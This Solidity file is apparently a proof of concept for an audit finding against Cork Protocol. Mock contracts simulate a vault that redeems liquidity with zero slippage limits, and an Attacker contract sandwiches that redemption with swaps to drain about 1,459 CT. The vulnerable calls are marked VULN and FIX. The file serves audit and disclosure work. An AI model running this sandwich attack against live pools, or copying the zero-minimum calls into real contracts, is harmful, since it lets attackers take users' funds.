// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Cork Protocol — H-1 (Sherlock 2024-08, issue 66)
    redeemEarly removes RA/CT liquidity with amount mins of 0 and sells the
    excess CT with amountOutMin 0. A prior swap moves the pool from 2,000/2,000
    to 200/20,000. The vault's half of the LP then returns 150 RA instead of
    the 1,500 RA the same redemption gets on an unskewed pool.
    The attacker swaps the RA back and keeps 1,459.459 CT of the vault's CT. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    Token public ra;
    Token public ct;
    address public router;
    uint256 public raReserve;
    uint256 public ctReserve;
    uint256 public lpSupply;
    mapping(address => uint256) public lpOf;

    constructor(Token _ra, Token _ct) {
        ra = _ra;
        ct = _ct;
    }

    function setRouter(address _router) external {
        require(router == address(0), "router");
        router = _router;
    }

    function seed(address vault, address market) external {
        require(msg.sender == router, "router");
        raReserve = ra.balanceOf(address(this));
        ctReserve = ct.balanceOf(address(this));
        lpSupply = raReserve;
        lpOf[vault] = raReserve / 2;
        lpOf[market] = raReserve / 2;
    }

    function applySwap(bool ctIn, uint256 amountIn, uint256 amountOut, address to) external {
        require(msg.sender == router, "router");
        if (ctIn) {
            raReserve -= amountOut;
            ctReserve += amountIn;
            require(ra.transfer(to, amountOut), "ra");
        } else {
            ctReserve -= amountOut;
            raReserve += amountIn;
            require(ct.transfer(to, amountOut), "ct");
        }
    }

    function burn(address owner, uint256 lp, uint256 minRa, uint256 minCt, address to)
        external
        returns (uint256 raAmt, uint256 ctAmt)
    {
        require(msg.sender == router, "router");
        require(lpOf[owner] >= lp, "lp");
        raAmt = raReserve * lp / lpSupply;
        ctAmt = ctReserve * lp / lpSupply;
        require(raAmt >= minRa && ctAmt >= minCt, "min");
        lpOf[owner] -= lp;
        lpSupply -= lp;
        raReserve -= raAmt;
        ctReserve -= ctAmt;
        require(ra.transfer(to, raAmt), "ra");
        require(ct.transfer(to, ctAmt), "ct");
    }
}

contract Router {
    Pool public pool;
    Token public ra;
    Token public ct;

    constructor(Pool _pool) {
        pool = _pool;
        ra = _pool.ra();
        ct = _pool.ct();
    }

    function seed(address vault, address market) external {
        pool.seed(vault, market);
    }

    function removeLiquidity(address, address, uint256 lp, uint256 amountAMin, uint256 amountBMin, address to, uint256)
        external
        returns (uint256 raAmt, uint256 ctAmt)
    {
        return pool.burn(msg.sender, lp, amountAMin, amountBMin, to);
    }

    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256)
        external
        returns (uint256[] memory amounts)
    {
        require(Token(path[0]).transferFrom(msg.sender, address(pool), amountIn), "in");
        bool ctIn = path[0] == address(ct);
        uint256 outAmt;
        if (ctIn) {
            outAmt = amountIn * pool.raReserve() / (pool.ctReserve() + amountIn);
        } else {
            outAmt = amountIn * pool.ctReserve() / (pool.raReserve() + amountIn);
        }
        require(outAmt >= amountOutMin, "slip");
        pool.applySwap(ctIn, amountIn, outAmt, to);
        amounts = new uint256[](2);
        amounts[0] = amountIn;
        amounts[1] = outAmt;
    }
}

contract Vault {
    Pool public pool;
    Router public router;
    Token public ra;
    Token public ct;
    uint256 public raGot;

    constructor(Pool _pool, Router _router) {
        pool = _pool;
        router = _router;
        ra = _pool.ra();
        ct = _pool.ct();
    }

    function redeemEarly() external {
        uint256 lp = pool.lpOf(address(this));
        // @> VULN: amountAMin and amountBMin are 0, and the deadline is block.timestamp
        (uint256 raAmt, uint256 ctAmt) =
            router.removeLiquidity(address(ra), address(ct), lp, 0, 0, address(this), block.timestamp);
        // FIX: pass a caller-supplied minimum RA and a real deadline.
        if (ctAmt != 0) {
            require(ct.approve(address(router), ctAmt), "approve");
            address[] memory path = new address[](2);
            path[0] = address(ct);
            path[1] = address(ra);
            // @> VULN: amountOutMin is 0, so the CT sale accepts any RA out
            raAmt += router.swapExactTokensForTokens(ctAmt, 0, path, address(this), block.timestamp)[1];
            // FIX: pass amountOutMin from the preview and a deadline ahead of this block.
        }
        raGot = raAmt;
    }
}

contract Attacker {
    function frontRun(Router router, Token ct, Token ra, uint256 amount) external {
        require(ct.approve(address(router), amount), "approve");
        address[] memory path = new address[](2);
        path[0] = address(ct);
        path[1] = address(ra);
        router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
    }

    function backRun(Router router, Token ra, Token ct) external {
        uint256 amount = ra.balanceOf(address(this));
        require(ra.approve(address(router), amount), "approve");
        address[] memory path = new address[](2);
        path[0] = address(ra);
        path[1] = address(ct);
        router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
    }
}

contract Exploit {
    uint256 public constant START_CT = 18_000 ether;
    uint256 public constant PROFIT = 1_459_459459459459459459;

    Token public ra; // nonce 1
    Token public ct; // nonce 2
    Pool public pool; // nonce 3
    Router public router; // nonce 4
    Vault public vault; // nonce 5
    Attacker public attacker; // nonce 6

    constructor() {
        ra = new Token("RA");
        ct = new Token("CT");
        pool = new Pool(ra, ct);
        router = new Router(pool);
        pool.setRouter(address(router));
        vault = new Vault(pool, router);
        attacker = new Attacker();
        ra.mint(address(pool), 2_000 ether);
        ct.mint(address(pool), 2_000 ether);
        router.seed(address(vault), address(0xBEEF));
        ct.mint(address(attacker), START_CT);
    }

    function run() external {
        uint256 beforeCt = ct.balanceOf(address(attacker));
        attacker.frontRun(router, ct, ra, START_CT);
        vault.redeemEarly();
        attacker.backRun(router, ra, ct);
        require(vault.raGot() == 150 ether, "vault ra");
        require(ct.balanceOf(address(attacker)) - beforeCt == PROFIT, "ct profit");
        require(ct.balanceOf(address(attacker)) == 19_459_459459459459459459, "final ct");
    }
}
